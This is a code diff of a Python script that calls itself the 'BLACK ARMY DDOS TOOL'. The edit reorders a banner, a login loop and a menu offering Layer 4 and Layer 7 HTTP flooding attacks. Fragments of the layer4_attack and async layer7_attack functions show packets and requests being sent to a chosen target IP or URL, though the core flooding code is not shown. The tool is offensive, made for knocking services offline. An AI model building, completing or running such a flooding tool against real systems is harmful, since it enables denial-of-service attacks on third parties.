@@ -53,10 +53,10 @@ def display_header():
     for line in header_lines:
         print(line)
         time.sleep(0.0015)  # typing effect
-print(f"\033[37m╔{'═' * 66}╗")
-print(f"\033[37m║\033[0m \033[41m{' ' * 20} SCRIPT ADMIN BLACK ARMY {' ' * 19}\033[0m \033[37m║")
-print(f"\033[37m║\033[0m \033[41m  Designt By: KunFay'99{' ' * 41}\033[0m \033[37m║")
-print(f"\033[37m╚{'═' * 66}╝")
+        print(f"\033[37m╔{'═' * 66}╗")
+        print(f"\033[37m║\033[0m \033[41m{' ' * 20} SCRIPT ADMIN BLACK ARMY {' ' * 19}\033[0m \033[37m║")
+        print(f"\033[37m║\033[0m \033[41m  Designt By: KunFay'99{' ' * 41}\033[0m \033[37m║")
+        print(f"\033[37m╚{'═' * 66}╝")
 while attemps < 100:
     username = input("\033[100m \033[32m••> Enter your username: \033[33m \033[0m")
     password = input("\033[100m \033[31m••> Enter your password: \033[33m \033[0m")
@@ -69,6 +69,18 @@ while attemps < 100:
         attemps += 1
         continue
 
+# ============================
+#   Menu Utama
+# ============================
+def main():
+    clear()
+    display_header()
+    print(Fore.MAGENTA + Style.BRIGHT + "=== ⚔️ BLACK ARMY DDOS TOOL ===")
+    print(Fore.YELLOW + "1. Layer 4 Attack")
+    print(Fore.CYAN + "2. Layer 7 HTTP Attack")
+    choice = input(Fore.WHITE + "\nSelect option: ")
+    print(Fore.RED + "\n[!] Invalid choice.")
+    
 #=============================
 #   Layer 4 Stress Tes
 # ============================
@@ -105,7 +117,7 @@ def layer4_attack(target_ip, duration):
         print(Fore.RED + f"[] LAYER 4 {Fore.YELLOW}ADMIN-HACK {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {CSS} {Fore.WHITE} BYTES TO {target_ip}:{port} {Fore.GREEN}Running :::")
         time.sleep(0.2)
     print(Fore.GREEN + "\n[✔] LAYER 4 \033[1;31m F I N N A L Y  AT T A C K !\n")
-    
+
 # ============================
 #   Layer 7 Stress Test
 # ============================
@@ -153,17 +165,7 @@ async def layer7_attack(url, concurrency, duration):
         results = await asyncio.gather(*tasks)
     print(Fore.WHITE + f"\n[✔] Total requests sent: {sum(results)}")
     
-# ============================
-#   Menu Utama
-# ============================
-def main():
-    clear()
-    display_header()
-    print(Fore.MAGENTA + Style.BRIGHT + "=== ⚔️ BLACK ARMY DDOS TOOL ===")
-    print(Fore.YELLOW + "1. Layer 4 Attack")
-    print(Fore.CYAN + "2. Layer 7 HTTP Attack")
-    choice = input(Fore.WHITE + "\nSelect option: ")
-    print(Fore.RED + "\n[!] Invalid choice.")
+
 
 if __name__ == "__main__":
     main()
